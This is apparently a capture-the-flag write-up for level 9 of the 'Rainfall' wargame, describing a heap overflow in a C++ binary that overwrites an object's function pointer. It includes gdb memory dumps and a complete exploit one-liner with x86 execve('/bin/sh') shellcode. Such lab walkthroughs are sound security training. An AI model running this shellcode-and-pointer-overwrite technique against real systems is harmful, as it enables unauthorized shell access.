# Rainfall - Level 9

## Executable Analyse

This exercise exploits a c++ code declaring a class N.
This class N contains 3 things:
- a pointer on function f
- a string of 100 characteres
- an int, initalised by the constructor.

The main function initalizes two N objects.
Then a memcpy is called to set the string value of the first object, using the first program argument.
Finally the main calls the pointer on function of the second object. 

As in one of the previous levels, the user input is not controlled and copied into a buffer of finite size (100).
Our goals is to rewrite the function pointer execute in the second object.

## Heap Overflow

```bash
level9@RainFall:~$ ltrace ./level9 42
[...]
_Znwj(108, 0xbffff7f4, 0xbffff800, 0xb7d79e55, 0xb7fed280)                     = 0x804a008
_Znwj(108, 5, 0xbffff800, 0xb7d79e55, 0xb7fed280)                              = 0x804a078
memcpy(0x0804a00c, "42", 2)                                                    = 0x0804a00c

```
Znwj represents our first object and his memory address is 0x804a008

If we print this heap address : 
```asm
(gdb) x/200x 0x804a008

0x804a008:	0x08048848	0x00003234	0x00000000	0x00000000
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000005

0x804a078:	0x08048848	0x00000000	0x00000000	0x00000000
0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0d8:	0x00000000	0x00000000	0x00000006
```

Our value '42' is on the first line, second column (*0x804a00c*), and the object given values '5', and '6', are at the end of each block. 


```asm
(gdb) x/200x 0x804a008

0x804a008:	0x08048848	0x0804a010	0x895e1feb	0xc0310876
0x804a018:	0x89074688	0x0bb00c46	0x4e8df389	0x0c568d08
0x804a028:	0xdb3180cd	0xcd40d889	0xffdce880	0x622fffff
0x804a038:	0x732f6e69	0x61616168	0x61616161	0x61616161
0x804a048:	0x61616161	0x61616161	0x61616161	0x61616161
0x804a058:	0x61616161	0x61616161	0x61616161	0x61616161
0x804a068:	0x61616161	0x61616161	0x61616161

0x804a078:	0x0804a00c	0x00000000	0x00000000	0x00000000
0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0d8:	0x00000000	0x00000000	0x00000006
```

Considering the first field of the object is a function pointer, we need to set the address of our shellcode

Sending buffer will looks like :  
>[buffer_address] [shellcode] [address_of_first_pointer_function]

**[buffer address]** = *0x804a00c* + 4  -> *0x804a010*  
**[shellcode]** = execv("/bin/sh")
x86 Shellcode found on : https://beta.hackndo.com/buffer-overflow/  
**[adddress of pointer function] : *0x804a00c*

Give us :

```shell
./level9 $(python -c 'print "\x08\x04\xa0\x10"[::-1] + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "a" * (108 - 45 - 4) + "\x08\x04\xa0\x0c"[::-1]')
```
